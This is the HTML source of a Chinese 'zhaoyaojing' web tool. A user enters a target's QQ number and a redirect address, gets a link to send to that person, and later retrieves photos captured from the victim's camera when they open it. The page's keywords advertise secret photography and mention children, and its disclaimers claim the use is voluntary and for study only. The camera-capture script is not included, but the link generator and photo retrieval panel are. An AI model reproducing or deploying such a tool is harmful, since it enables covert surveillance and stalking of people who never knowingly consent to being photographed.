<!DOCTYPE html>
<html lang="zh-cn">
  <head>
    <meta charset="utf-8">
    <meta name="renderer" content="webkit">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>网页在线照妖镜源码</title>
    <meta name="keywords" content="照妖镜,偷拍网站,小朋友">
    <meta name="description" content="打开生成的链接可拍摄对方照片">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link href="//cdn.staticfile.org/twitter-bootstrap/3.4.1/css/bootstrap.min.css" rel="stylesheet">
  <link href="//cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
  <script src="//cdn.staticfile.org/jquery/2.1.4/jquery.min.js"></script>
  <script src="//cdn.staticfile.org/twitter-bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <!--[if lt IE 9]>
    <script src="//cdn.staticfile.org/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="//cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@8"></script>
    
<style type="text/css">
    .hr1{ 
        height:1px;
        border:none;
        border-top:1px dashed #0066CC;
    }

	body{
		margin: 0 auto;
		text-align: center;
	}
	.container {
	  max-width: 580px;
	  padding: 15px;
	  margin: 0 auto;
	}
</style>

  <script type="text/javascript">
    $(function () {
      function getNowFormatDate() {
        var date = new Date();
        var month = date.getMonth() + 1;
        var strDate = date.getDate();
        var currentdate = month + "月" + strDate + "日";
        return currentdate;
      }
      var text = [
        "请勿用于非法用途，谢谢！",
        "本站免费使用，欢迎支持我们！",
        "目前稳定运营，有充足的服务器资源",
        "有问题欢迎反馈www.sjhv.com",
      ], content = "";
      for (var i = 0; i < text.length; i++) {
        content += (i + 1) + ". " + text[i] + "\n";
      }
      setTimeout(function () {
        swal(getNowFormatDate() + "通知", content, "success");
      }, 1000)
    });
    
function create() {
    var input = document.getElementById('content');
    var kd = document.getElementById('kd');
    var myid = document.getElementById('myid');
    var url = document.getElementById('myurl');
    if (myid.value=="" || url.value==""){
        swal("ID或跳转地址不能为空！");
        return false;
    }
    var myid1 = myid;
    kd.href = 'https://echocbx.github.io/?id='+myid.value+'&url='+url.value;   //在这修改域名   替换就行
    kd.style = ''; 
    kd.innerText = 'https://echocbx.github.io/?id='+myid.value+'&url='+url.value; //两个都要替换    这就好了
    //总结两点   配置ssl   不会百度    然后修改替换域名完事 就是这么简单 小学生基础

    
}
  </script>
    <!--百度提交-->
  <script>
    (function() {
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      } else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
    })();
  </script>
  </head>
  
  <body style="background-image: url(http://www.sjhv.com/tapi/acgurl.php);">
    <div class="container">
    	<div class="header">
      <ul class="nav nav-pills pull-right" role="tablist">
        <li role="presentation" class="active"><a href="http://wlopck.gitee.io/">作者博客</a></li>
      </ul>
      <h3 class="text-muted" align="left">
        <img src="https://z3.ax1x.com/2021/04/20/c7NmY6.png" width="150px" height="47px"></img><font color="#8968CD"><b>Echocbx照妖镜</b></font>
      </h3>
    </div>
<hr class="hr1">
       <marquee style="color:red; font-size:large"><img src="https://z3.ax1x.com/2021/03/29/cC3HeJ.gif" width="35px" height="35px">欢迎使用Echocbx照妖镜</marquee>
<div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.8)">
        <div class="panel-heading" style="background: linear-gradient(to right,#b221ff,#14b7ff,#8ae68a)">
<h3 class="panel-title">生成面板</h3>
</div>
        <div class="panel-body">
				<div class="panel-body">
            <input type="text" style="background: rgba(255, 251, 251, 0.7)" class="form-control" id="myid" value= '' placeholder="请输入对方QQ生成链接，请填写数字，这是你查看照片的唯一凭证">
               <br>
               
            <input type="text" style="background: rgba(255, 251, 251, 0.7)" class="form-control" id="myurl" value= 'http://www.sjhv.com' placeholder="请输入上传照片后要跳转的网址">
               <br>
             <input type= "button" class="btn btn-primary btn-block" value= '生成链接'  onclick= 'create();'  />
             <br>
             <a id="kd" style="pointer-events: none;">请先生成链接！</a></br>
		</div>
        </div>
      </div>
      <div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
          <div class="panel-body">
            <input type="text" style="background: rgba(255, 251, 251, 0.7)" class="form-control" id="myid1" value= '' placeholder="请输入凭证查询照片">
            <br>
            <input type= "button" class="btn btn-primary btn-block" value= '查看照片'  onclick=window.location.href='ck.php?id='+document.getElementById('myid1').value> 
             <input type= "button" class="btn btn-primary btn-block" value= '删除照片'  onclick=window.location.href='ck.php?type=dell&id='+document.getElementById('myid1').value> 

           </div>
           
      </div>
      <div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
        <div class="panel-body">
          <div class="alert alert-info" role="alert">
            <br>作者声明：
            <br>1.本工具仅做学习交流使用,请勿用于非法用途!后果自负!网站拍照是用户自愿点击允许的！
            <br>2.凭证是查看照片的凭证,不要泄露给知道这个平台的人
            <br>3.如有侵权、肖像权等,请联系本站下方邮箱删除！
            <br>使用说明：
            <br>1.填写对方QQ方便日后查询!填写完成后不用管直接点击生成!
            <br>2.生成完成后,复制链接发给你要查询的人
            <br>3.他点开后,然后回到本站,填写对方QQ,然后点击查看照片即可！
            <br>4.由于系统安全机制，ios系统必须使用自带的Safari浏览器（或者第三方APP调用的是Safari内核）才行
            <br>仅供娱乐使用,请勿用于非法商业用途,否则后果自负！
            <font color="#e600ff"><br>数据汇技术网</font>
            <font color="#e600ff"><br>QQ群：948848072</font>
            <font color="#e600ff"><br><a href="http://www.sjhv.com/">本站源码由数据汇技术网www.sjhv.com免费提供</a></font>
            
            <hr class="top_hr_style02">
			<body bgcolor="#ffd200"><span id="localtime"></span>
	</nav></header>
	       <script type="text/javascript">
                    function showLocale(objD) {
                        var str, colorhead, colorfoot;
                        var yy = objD.getYear();
                        if (yy < 1900) yy = yy + 1900;
                        var MM = objD.getMonth() + 1;
                        if (MM < 10) MM = '0' + MM;
                        var dd = objD.getDate();
                        if (dd < 10) dd = '0' + dd;
                        var hh = objD.getHours();
                        if (hh < 10) hh = '0' + hh;
                        var mm = objD.getMinutes();
                        if (mm < 10) mm = '0' + mm;
                        var ss = objD.getSeconds();
                        if (ss < 10) ss = '0' + ss;
                        var ww = objD.getDay();
                        if (ww == 0) colorhead = "<font color=\"#FF3030\">";
                        if (ww > 0 && ww < 6) colorhead = "<font color=\"#FF3030\">";
                        if (ww == 6) colorhead = "<font color=\"#FF3030\">";
                        if (ww == 0) ww = "星期日";
                        if (ww == 1) ww = "星期一";
                        if (ww == 2) ww = "星期二";
                        if (ww == 3) ww = "星期三";
                        if (ww == 4) ww = "星期四";
                        if (ww == 5) ww = "星期五";
                        if (ww == 6) ww = "星期六";
                        colorfoot = "</font>"
                        str = colorhead + yy + "-" + MM + "-" + dd + "丨" + hh + ":" + mm + ":" + ss + "丨" + ww + colorfoot;
                        return (str);
                    }
                    function tick() {
                        var today;
                        today = new Date();
                        document.getElementById("localtime").innerHTML = showLocale(today);
                        window.setTimeout("tick()", 1000);
                    }
                    tick();
                </script>
        <p style="text-align:center">
            &copy; Powered by
          <a href="http://www.sjhv.com/">数据汇技术网</a>!</p>
          
</div>
  </body>
</html>